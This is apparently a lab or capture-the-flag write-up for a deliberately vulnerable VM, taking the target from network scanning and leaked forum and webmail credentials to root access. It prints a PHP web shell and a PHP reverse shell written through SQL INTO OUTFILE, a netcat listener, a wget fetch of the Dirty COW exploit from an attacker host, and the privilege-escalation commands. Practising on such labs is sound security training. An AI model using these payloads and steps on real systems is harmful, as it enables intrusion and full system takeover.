
# Writeup1

## 1. Network Setup and Discovery

First, connect the target virtual machine to a Host-Only or Bridged Adapter network to allow communication.

Run `nmap` to identify the IP address and open ports:

```bash
nmap 192.168.56.0-255
```

**Nmap Result:**

- Target IP: `192.168.56.103` in may case
- Open Ports: `21 (ftp), 22 (ssh), 80 (http), 143 (imap), 443 (https), 993 (imaps)`

## 2. Web Enumeration

Accessing `http://192.168.56.103` shows a standard "TryHackMe" landing page.

Use `dirsearch` to enumerate directories over HTTP and HTTPS:

```bash
./dirsearch.py -u https://192.168.56.103/
./dirsearch.py -u http://192.168.56.103/
```
dirsearch an enligne tool.

**Interesting HTTPS Directories (Status 200):**
- `/forum/`
- `/phpmyadmin/`
- `/phpmyadmin/index.php`
- `/webmail/` (301 redirect)

## 3. Initial Access via Forum Login

Navigating to `https://192.168.56.103/forum/`, we found a log file contain a password leak:
 Probleme login ? - lmezard, 2015-10-08, 00:10.
 exploring content we see a password log:

```
Failed password for invalid user !q\]Ej?*5K5cy*AJ
```

Try this password with the user `lmezard`. It logs in successfully on the forum.

**Discovered Email:** `laurie@borntosec.net`  
Use it with the same password on `https://192.168.56.103/webmail/`.

## 4. Database Access via Webmail

Read an email titled `DB Access`:

```
You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
```

Login to phpMyAdmin:  
**User:** `root`  
**Pass:** `Fg-'kKXBj87E:aJ$`  
URL: `https://192.168.56.103/phpmyadmin/`

## 5. Gaining Code Execution

Cannot write files directly (`#1 - Can't create/write to file`). Use SQL to enumerate writable paths via `dirsearch` on `/forum/`.

tested a list of 200 status code locations.

Writable directory found: `/forum/templates_c/`

testing to get the curent directory:
```sql
SELECT "<?php system($_GET['cmd']); ?>" 
INTO OUTFILE '/var/www/forum/templates_c/test.php'
```
```bash
curl https://192.168.56.103/forum/templates_c/test.php?cmd=pwd
> /var/www/forum/templates_c/
```


Upload reverse shell using SQL for dynamic navigation:

```sql
SELECT "<?php $s=fsockopen('< host ip>',1234);$proc=proc_open('/bin/bash -i',array(0=>$s,1=>$s,2=>$s),$pipes);?>"
INTO OUTFILE '/var/www/forum/templates_c/shellkali1.php'
```

Start a listener on the host machine:

```bash
nc -lvnp 1234
```

Trigger the shell:

```bash
curl https://192.168.56.103/forum/templates_c/shellkali1.php
```

## 6. Privilege Escalation

Check OS version:

```bash
uname -a
lsb_release -a
```

**Kernel:** `3.2.0-91-generic-pae`  
**OS:** `Ubuntu 12.04`

Vulnerable to Dirty COW.

Download and compile Dirty COW exploit:

```bash
python3 -m http.server 2244 
wget http://<attacker_ip>:2244/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
```

Run exploit:

```bash
./dirty <new_password>
mv /tmp/passwd /etc/passwd
```

Fix shell with:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Become root:

```bash
su
Password: <new_password>

id
# uid=0(root) gid=0(root) groups=0(root)
```

## ✅ Root Access Achieved!